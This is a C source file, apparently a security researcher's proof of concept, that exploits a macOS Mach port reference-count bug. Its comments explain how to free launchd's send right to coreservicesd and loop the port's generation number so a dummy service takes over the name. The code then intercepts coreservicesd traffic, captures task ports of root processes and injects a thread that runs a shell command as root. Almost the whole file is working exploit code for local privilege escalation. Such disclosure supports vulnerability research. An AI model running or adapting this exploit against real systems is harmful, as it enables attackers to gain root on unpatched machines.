// ianbeer
// build: clang -o service_mitm service_mitm.c

#if 0
Exploit for the urefs saturation bug

The challenge to exploiting this bug is getting the exact same port name reused
in an interesting way.

This requires us to dig in a bit to exacly what a port name is, how they're allocated
and under what circumstances they'll be reused.

Mach ports are stored in a flat array of ipc_entrys:

	struct ipc_entry {
		struct ipc_object *ie_object;
		ipc_entry_bits_t ie_bits;
		mach_port_index_t ie_index;
		union {
			mach_port_index_t next;		/* next in freelist, or...  */
			ipc_table_index_t request;	/* dead name request notify */
		} index;
	};

mach port names are made up of two fields, the upper 24 bits are an index into the ipc_entrys table
and the lower 8 bits are a generation number. Each time an entry in the ipc_entrys table is reused
the generation number is incremented. There are 64 generations, so after an entry has been reallocated
64 times it will have the same generation number.

The generation number is checked in ipc_entry_lookup:

	if (index <  space->is_table_size) {
                entry = &space->is_table[index];
		if (IE_BITS_GEN(entry->ie_bits) != MACH_PORT_GEN(name) ||
		    IE_BITS_TYPE(entry->ie_bits) == MACH_PORT_TYPE_NONE)
			entry = IE_NULL;		
	}

here entry is the ipc_entry struct in the kernel and name is the user-supplied mach port name.

Entry allocation:
The ipc_entry table maintains a simple LIFO free list for entries; if this list is free the table will 
be grown. The table is never shrunk.

Reliably looping mach port names:
To exploit this bug we need a primitive that allows us to loop a mach port's generation number around.

After triggering the urefs bug to free the target mach port name in the target process we immediately
send a message with N ool ports (with send rights) and no reply port. Since the target port was the most recently
freed it will be at the head of the freelist and will be reused to name the first of the ool ports
contained in the message (but with an incremented generation number.)
Since this message is not expected by the service (in this case we send an
invalid XPC request to launchd) it will get passed to mach_msg_destroy which will pass each of 
the ports to mach_port_deallocate freeing them in the order in which they appear in the message. Since the
freed port was reused to name the first ool port it will be the first to be freed. This will push the name
N entries down the freelist.

We then send another 62 of these looper messages but with 2N ool ports. This has the effect of looping the generation
number of the target port around while leaving it in approximately the middle of the freelist. The next time the target entry
in the table is allocated it will have exactly the same mach port name as the original target right we
triggered the urefs bug on.

For this PoC I target the send right to com.apple.CoreServices.coreservicesd which launchd has.

I look up the coreservicesd service in launchd then use the urefs bug to free launchd's send right and use the
looper messages to spin the generation number round. I then register a large number of dummy services
with launchd so that one of them reuses the same mach port name as launchd thinks the coreservicesd service has.

Now when any process looks up com.apple.CoreServices.coreservicesd launchd will actually send them a send right
to one of my dummy services :)

I add all those dummy services to a portset and use that recieve right and the legitimate coreservicesd send right
I still have to MITM all these new connections to coreservicesd. I look up a few root services which send their
task ports to coreservices and grab these task ports in the mitm and start a new thread in the uid 0 process to run a shell command as root :)

The whole flow seems to work about 50% of the time.
#endif

#include <stdio.h>
#include <stdlib.h>
#include <unistd.h>
#include <libproc.h>
#include <pthread.h>

#include <servers/bootstrap.h>
#include <mach/mach.h>
#include <mach/mach_vm.h>

void run_command(mach_port_t target_task, char* command) {
  kern_return_t err;

  size_t command_length = strlen(command) + 1;
  size_t command_page_length = ((command_length + 0xfff) >> 12) << 12;
  command_page_length += 1; // for the stack

  // allocate some memory in the task
  mach_vm_address_t command_addr = 0;
  err = mach_vm_allocate(target_task,
                         &command_addr,
                         command_page_length,
                         VM_FLAGS_ANYWHERE);

  if (err != KERN_SUCCESS) {
    printf("mach_vm_allocate: %s\n", mach_error_string(err));
    return;
  }

  printf("allocated command at %llx\n", command_addr);
  uint64_t bin_bash = command_addr;
  uint64_t dash_c = command_addr + 0x10;
  uint64_t cmd = command_addr + 0x20;
  uint64_t argv = command_addr + 0x800;

  uint64_t argv_contents[] = {bin_bash, dash_c, cmd, 0};

  err = mach_vm_write(target_task,
                      bin_bash,
                      (mach_vm_offset_t)"/bin/bash",
                      strlen("/bin/bash") + 1);

  err = mach_vm_write(target_task,
                      dash_c,
                      (mach_vm_offset_t)"-c",
                      strlen("-c") + 1);

  err = mach_vm_write(target_task,
                      cmd,
                      (mach_vm_offset_t)command,
                      strlen(command) + 1);

  err = mach_vm_write(target_task,
                      argv,
                      (mach_vm_offset_t)argv_contents,
                      sizeof(argv_contents));

  if (err != KERN_SUCCESS) {
    printf("mach_vm_write: %s\n", mach_error_string(err));
    return;
  }

  // create a new thread:
  mach_port_t new_thread = MACH_PORT_NULL;
  x86_thread_state64_t state;
  mach_msg_type_number_t stateCount = x86_THREAD_STATE64_COUNT;

  memset(&state, 0, sizeof(state));

  // the minimal register state we require:
  state.__rip = (uint64_t)execve;
  state.__rdi = (uint64_t)bin_bash;
  state.__rsi = (uint64_t)argv;
  state.__rdx = (uint64_t)0;

  err = thread_create_running(target_task,
                              x86_THREAD_STATE64,
                              (thread_state_t)&state,
                              stateCount,
                              &new_thread);

  if (err != KERN_SUCCESS) {
    printf("thread_create_running: %s\n", mach_error_string(err));
    return;
  }

  printf("done?\n");
}


mach_port_t lookup(char* name) {
  mach_port_t service_port = MACH_PORT_NULL;
  kern_return_t err = bootstrap_look_up(bootstrap_port, name, &service_port);
  if(err != KERN_SUCCESS){
    printf("unable to look up %s\n", name);
    return MACH_PORT_NULL;
  }
  
  if (service_port == MACH_PORT_NULL) {
    printf("bad service port\n");
    return MACH_PORT_NULL;
  }
  return service_port;
}

/*
host_service is the service which is hosting the port we want to free (eg the bootstrap port)
target_port is a send-right to the port we want to get free'd in the host service (eg another service port in launchd)
*/

struct ool_msg  {
  mach_msg_header_t hdr;
  mach_msg_body_t body;
  mach_msg_ool_ports_descriptor_t ool_ports;
};

// this msgh_id is an XPC message
uint32_t msgh_id_to_get_destroyed = 0x10000000;

void do_free(mach_port_t host_service, mach_port_t target_port) {
  kern_return_t err;

  int port_count = 0x10000;
  mach_port_t* ports = malloc(port_count * sizeof(mach_port_t));
  for (int i = 0; i < port_count; i++) {
    ports[i] = target_port;
  }

  // build the message to free the target port name
  struct ool_msg* free_msg = malloc(sizeof(struct ool_msg));
  memset(free_msg, 0, sizeof(struct ool_msg));

  free_msg->hdr.msgh_bits = MACH_MSGH_BITS_COMPLEX | MACH_MSGH_BITS(MACH_MSG_TYPE_COPY_SEND, 0);
  free_msg->hdr.msgh_size = sizeof(struct ool_msg);
  free_msg->hdr.msgh_remote_port = host_service;
  free_msg->hdr.msgh_local_port = MACH_PORT_NULL;
  free_msg->hdr.msgh_id = msgh_id_to_get_destroyed;

  free_msg->body.msgh_descriptor_count = 1;
  
  free_msg->ool_ports.address = ports;
  free_msg->ool_ports.count = port_count;
  free_msg->ool_ports.deallocate = 0;
  free_msg->ool_ports.disposition = MACH_MSG_TYPE_COPY_SEND;
  free_msg->ool_ports.type = MACH_MSG_OOL_PORTS_DESCRIPTOR;
  free_msg->ool_ports.copy = MACH_MSG_PHYSICAL_COPY;

  // send the free message
  err = mach_msg(&free_msg->hdr,
                 MACH_SEND_MSG|MACH_MSG_OPTION_NONE,
                 (mach_msg_size_t)sizeof(struct ool_msg),
                 0,
                 MACH_PORT_NULL,
                 MACH_MSG_TIMEOUT_NONE,
                 MACH_PORT_NULL); 
  printf("free message: %s\n", mach_error_string(err));
}

void send_looper(mach_port_t service, mach_port_t* ports, uint32_t n_ports, int disposition) {
  kern_return_t err;
  struct ool_msg msg = {0};
  msg.hdr.msgh_bits = MACH_MSGH_BITS(MACH_MSG_TYPE_COPY_SEND, 0) | MACH_MSGH_BITS_COMPLEX;
  msg.hdr.msgh_size = sizeof(msg);
  msg.hdr.msgh_remote_port = service;
  msg.hdr.msgh_local_port = MACH_PORT_NULL;
  msg.hdr.msgh_id = msgh_id_to_get_destroyed;

  msg.body.msgh_descriptor_count = 1;

  msg.ool_ports.address = (void*)ports;
  msg.ool_ports.count = n_ports;
  msg.ool_ports.disposition = disposition;
  msg.ool_ports.deallocate = 0;
  msg.ool_ports.type = MACH_MSG_OOL_PORTS_DESCRIPTOR;

  err = mach_msg(&msg.hdr,
                 MACH_SEND_MSG|MACH_MSG_OPTION_NONE,
                 (mach_msg_size_t)sizeof(struct ool_msg),
                 0,
                 MACH_PORT_NULL,
                 MACH_MSG_TIMEOUT_NONE,
                 MACH_PORT_NULL);
  printf("sending looper: %s\n", mach_error_string(err));

  // need to wait a little bit since we don't send a reply port and don't want to fill the queue
  usleep(100);
}

mach_port_right_t right_fixup(mach_port_right_t in) {
  switch (in) {
    case MACH_MSG_TYPE_PORT_SEND:
      return MACH_MSG_TYPE_MOVE_SEND;
    case MACH_MSG_TYPE_PORT_SEND_ONCE:
      return MACH_MSG_TYPE_MOVE_SEND_ONCE;
    case MACH_MSG_TYPE_PORT_RECEIVE:
      return MACH_MSG_TYPE_MOVE_RECEIVE;
    default:
      return 0; // no rights
  }
}

int ran_command = 0;

void inspect_port(mach_port_t port) {
  pid_t pid = 0;
  pid_for_task(port, &pid);
  if (pid != 0) {
    printf("got task port for pid: %d\n", pid);
  }
	// find the uid
  int proc_err;
  struct proc_bsdshortinfo info = {0};
  proc_err = proc_pidinfo(pid, PROC_PIDT_SHORTBSDINFO, 0, &info, sizeof(info));
  if (proc_err <= 0) {
    // fail
    printf("proc_pidinfo failed\n");
    return;
  }

	if (info.pbsi_uid == 0) {
		printf("got r00t!! ******************\n");
    printf("(via task port for: %s)\n", info.pbsi_comm);
	  if (!ran_command) {
      run_command(port, "echo hello > /tmp/hello_from_root");
      ran_command = 1;
    }
  }

  return;
}

/*
implements the mitm
replacer_portset contains receive rights for all the ports we send to launchd
to replace the real service port

real_service_port is a send-right to the actual service

receive messages on replacer_portset, inspect them, then fix them up and send them along
to the real service
*/
void do_service_mitm(mach_port_t real_service_port, mach_port_t replacer_portset) {
  size_t max_request_size = 0x10000;	
	mach_msg_header_t* request = malloc(max_request_size);

  for(;;) {
    memset(request, 0, max_request_size);
    kern_return_t err = mach_msg(request,
                                 MACH_RCV_MSG | 
                                 MACH_RCV_LARGE, // leave larger messages in the queue
                                 0,
                                 max_request_size,
                                 replacer_portset,
                                 0,
                                 0);

    if (err == MACH_RCV_TOO_LARGE) {
      // bump up the buffer size
      mach_msg_size_t new_size = request->msgh_size + 0x1000;
      request = realloc(request, new_size);
      // try to receive again
      continue;
    }

    if (err != KERN_SUCCESS) {
      printf("error receiving on port set: %s\n", mach_error_string(err));
      exit(EXIT_FAILURE);
    }

    printf("got a request, fixing it up...\n");

    // fix up the message such that it can be forwarded:

    // get the rights we were sent for each port the header
    mach_port_right_t remote = MACH_MSGH_BITS_REMOTE(request->msgh_bits);
    mach_port_right_t voucher = MACH_MSGH_BITS_VOUCHER(request->msgh_bits);
   
    // fixup the header ports:
    // swap the remote port we received into the local port we'll forward
    // this means we're only mitm'ing in one direction - we could also
    // intercept these replies if necessary
    request->msgh_local_port = request->msgh_remote_port;
    request->msgh_remote_port = real_service_port;
    // voucher port stays the same

    int is_complex = MACH_MSGH_BITS_IS_COMPLEX(request->msgh_bits);
    
    // (remote, local, voucher)
    request->msgh_bits = MACH_MSGH_BITS_SET_PORTS(MACH_MSG_TYPE_COPY_SEND, right_fixup(remote), right_fixup(voucher));

    if (is_complex) {
      request->msgh_bits |= MACH_MSGH_BITS_COMPLEX;

      // if it's complex we also need to fixup all the descriptors...
      mach_msg_body_t* body = (mach_msg_body_t*)(request+1);
      mach_msg_type_descriptor_t* desc = (mach_msg_type_descriptor_t*)(body+1);
      for (mach_msg_size_t i = 0; i < body->msgh_descriptor_count; i++) {
        switch (desc->type) {
          case MACH_MSG_PORT_DESCRIPTOR: {
            mach_msg_port_descriptor_t* port_desc = (mach_msg_port_descriptor_t*)desc;
            inspect_port(port_desc->name);
            port_desc->disposition = right_fixup(port_desc->disposition);
            desc = (mach_msg_type_descriptor_t*)(port_desc+1);
            break;
          }
          case MACH_MSG_OOL_DESCRIPTOR: {
            mach_msg_ool_descriptor_t* ool_desc = (mach_msg_ool_descriptor_t*)desc;
            // make sure that deallocate is true; we don't want to keep this memory:
            ool_desc->deallocate = 1;
            desc = (mach_msg_type_descriptor_t*)(ool_desc+1);
            break;
          }
          case MACH_MSG_OOL_VOLATILE_DESCRIPTOR:
          case MACH_MSG_OOL_PORTS_DESCRIPTOR: {
            mach_msg_ool_ports_descriptor_t* ool_ports_desc = (mach_msg_ool_ports_descriptor_t*)desc;
            // make sure that deallocate is true:
            ool_ports_desc->deallocate = 1;
            ool_ports_desc->disposition = right_fixup(ool_ports_desc->disposition);
            desc = (mach_msg_type_descriptor_t*)(ool_ports_desc+1);
            break;
          }
        }
      }

    }

    printf("fixed up request, forwarding it\n");

    // forward the message:
    err = mach_msg(request,
                   MACH_SEND_MSG|MACH_MSG_OPTION_NONE,
                   request->msgh_size,
                   0,
                   MACH_PORT_NULL,
                   MACH_MSG_TIMEOUT_NONE,
                   MACH_PORT_NULL);

    if (err != KERN_SUCCESS) {
      printf("error forwarding service message: %s\n", mach_error_string(err));
      exit(EXIT_FAILURE);
    }
  }
	
}

void lookup_and_ping_service(char* name) {
  mach_port_t service_port = lookup(name);
  if (service_port == MACH_PORT_NULL) {
    printf("failed too lookup %s\n", name);
    return;
  }
  // send a ping message to make sure the service actually gets launched:
  kern_return_t err;
  mach_msg_header_t basic_msg;

  basic_msg.msgh_bits        = MACH_MSGH_BITS(MACH_MSG_TYPE_COPY_SEND, 0);
  basic_msg.msgh_size        = sizeof(basic_msg);
  basic_msg.msgh_remote_port = service_port;
  basic_msg.msgh_local_port  = MACH_PORT_NULL;
  basic_msg.msgh_reserved    = 0;
  basic_msg.msgh_id          = 0x41414141;

  err = mach_msg(&basic_msg,
                 MACH_SEND_MSG,
                 sizeof(basic_msg),
                 0,
                 MACH_PORT_NULL,
                 MACH_MSG_TIMEOUT_NONE,
                 MACH_PORT_NULL); 
  if (err != KERN_SUCCESS) {
    printf("failed to send ping message to service %s (err: %s)\n", name, mach_error_string(err));
    return;
  }

  printf("pinged %s\n", name);
}

void* do_lookups(void* arg) {
  lookup_and_ping_service("com.apple.storeaccountd");
  lookup_and_ping_service("com.apple.hidfud");
  lookup_and_ping_service("com.apple.netauth.sys.gui");
  lookup_and_ping_service("com.apple.netauth.user.gui");
  lookup_and_ping_service("com.apple.avbdeviced");
  return NULL;
}

void start_root_lookups_thread() {
  pthread_t thread;
  pthread_create(&thread, NULL, do_lookups, NULL);
}

char* default_target_service_name = "com.apple.CoreServices.coreservicesd";

int main(int argc, char** argv) {
  char* target_service_name = default_target_service_name;
  if (argc > 1) {
    target_service_name = argv[1];
  }

	// allocate the receive rights which we will try to replace the service with:
	// (we'll also use them to loop the mach port name in the target)
	size_t n_ports = 0x1000;
  mach_port_t* ports = calloc(sizeof(void*), n_ports);
  for (int i = 0; i < n_ports; i++) {
    kern_return_t err;
    err = mach_port_allocate(mach_task_self(), MACH_PORT_RIGHT_RECEIVE, &ports[i]);
    if (err != KERN_SUCCESS) {
      printf("failed to allocate port: %s\n", mach_error_string(err));
      exit(EXIT_FAILURE);
    }
		err = mach_port_insert_right(mach_task_self(),
							 ports[i],
							 ports[i],
							 MACH_MSG_TYPE_MAKE_SEND);
    if (err != KERN_SUCCESS) {
      printf("failed to insert send right: %s\n", mach_error_string(err));
      exit(EXIT_FAILURE);
    }
  }

	// generate some service names we can use:
	char** names = calloc(sizeof(char*), n_ports);
  for (int i = 0; i < n_ports; i++) {
    char name[64];
    sprintf(name, "replacer.%d", i);
    names[i] = strdup(name);
  }

  // lookup a send right to the target to be replaced
  mach_port_t target_service = lookup(target_service_name);

  // free the target in launchd
  do_free(bootstrap_port, target_service);

  // send one smaller looper message to push the free'd name down the free list:
  send_looper(bootstrap_port, ports, 0x100, MACH_MSG_TYPE_MAKE_SEND);

  // send the larger ones to loop the generation number whilst leaving the name in the middle of the long freelist
  for (int i = 0; i < 62; i++) {
    send_looper(bootstrap_port, ports, 0x200, MACH_MSG_TYPE_MAKE_SEND);
  }

	// now that the name should have looped round (and still be near the middle of the freelist
  // try to replace it by registering a lot of new services
  for (int i = 0; i < n_ports; i++) {
    kern_return_t err = bootstrap_register(bootstrap_port, names[i], ports[i]);
    if (err != KERN_SUCCESS) {
      printf("failed to register service %d, continuing anyway...\n", i);
    }
  }

  // add all those receive rights to a port set:
  mach_port_t ps;
  mach_port_allocate(mach_task_self(), MACH_PORT_RIGHT_PORT_SET, &ps);
  for (int i = 0; i < n_ports; i++) {
    mach_port_move_member(mach_task_self(), ports[i], ps);
  }

  start_root_lookups_thread();

	do_service_mitm(target_service, ps);
  return 0;
}

